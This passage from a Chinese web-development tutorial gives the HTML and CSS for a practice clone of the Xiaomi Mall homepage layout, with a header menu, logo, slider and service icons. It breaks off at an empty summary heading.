<h2><span id="案例小米商城">案例：小米商城</span></h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">	    <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.header</span> &#123;</span></span><br><span class="line"><span class="language-css">			 <span class="attribute">background</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">			 <span class="attribute">height</span>: <span class="number">38px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.header</span> <span class="selector-class">.menu</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.header</span> <span class="selector-class">.account</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">	    &#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.header</span> <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">1226px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.header</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">		    <span class="attribute">background</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">color</span>: <span class="number">#b0b0b0</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">line-height</span>: <span class="number">38px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">font-size</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin-right</span>: <span class="number">13px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.header</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.subheader</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.subheader</span> <span class="selector-class">.subcontainer</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.subheader</span> <span class="selector-class">.logo</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">234px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.subheader</span> <span class="selector-class">.logo</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin-top</span>: <span class="number">22px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.subheader</span> <span class="selector-class">.logo</span> <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">56px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">56px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.subheader</span> <span class="selector-class">.menu-list</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.subheader</span> <span class="selector-class">.menu-list</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">line-height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.subheader</span> <span class="selector-class">.menu-list</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">color</span>: <span class="number">#ff6700</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.subheader</span> <span class="selector-class">.search</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">234px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">background-color</span>: grey;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.slider</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin-top</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.slider</span> <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.slider</span> <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.news</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin-top</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">170px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.news</span> <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.news</span> <span class="selector-class">.channel</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">228px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">164px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">background-color</span>: grey;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">padding</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.news</span> <span class="selector-class">.channel</span> <span class="selector-class">.item</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">82px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">76px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.news</span> <span class="selector-class">.channel</span> <span class="selector-class">.item</span> <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">24px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">24px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin</span>: <span class="number">0</span> auto <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.news</span> <span class="selector-class">.channel</span> <span class="selector-class">.item</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">font-size</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">padding-top</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">opacity</span>: <span class="number">0.7</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.news</span> <span class="selector-class">.list-item</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">310px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">170px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">margin-left</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.app</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.app</span> <span class="selector-class">.download</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">		<span class="selector-class">.app</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.download</span> &#123;</span></span><br><span class="line"><span class="language-css">			<span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">		&#125;</span></span><br><span class="line"><span class="language-css">	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;menu&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>小米官网<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>小米商城<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>小米澎湃OS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>小米汽车<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>云服务<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>IoT<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>有品<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>小爱开放平台<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>资质证照<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>协议规则<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span> <span class="attr">class</span>=<span class="string">&quot;app&quot;</span>&gt;</span>下载App</span><br><span class="line">					<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;download&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/qrcode.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>Select Location<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;account&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com&quot;</span>&gt;</span>消息通知<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;subheader&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;subcontainer&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/mi_logo.png&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height:56px;width:56px;&quot;</span> /&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;menu-list&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span>小米手机<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span>Redmi手机<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span>电视<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span>笔记本<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span>平板<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span>家电<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span>路由器<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span>服务中心<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span>社区<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;search&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;slider&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sd-img&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/mi_slide.png&quot;</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;news&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;channel&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/news1.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">span</span>&gt;</span>保障服务<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/news2.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">span</span>&gt;</span>企业团购<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/news3.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">span</span>&gt;</span>F码通道<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/news4.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">span</span>&gt;</span>米粉卡<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/news5.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">span</span>&gt;</span>以旧换新<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.mi.com/&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/news6.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">span</span>&gt;</span>话费充值<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/mi_news1.png&quot;</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/mi_news2.jpg&quot;</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-item&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/mi_news3.png&quot;</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;clear: both&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结:</p>
<ul>
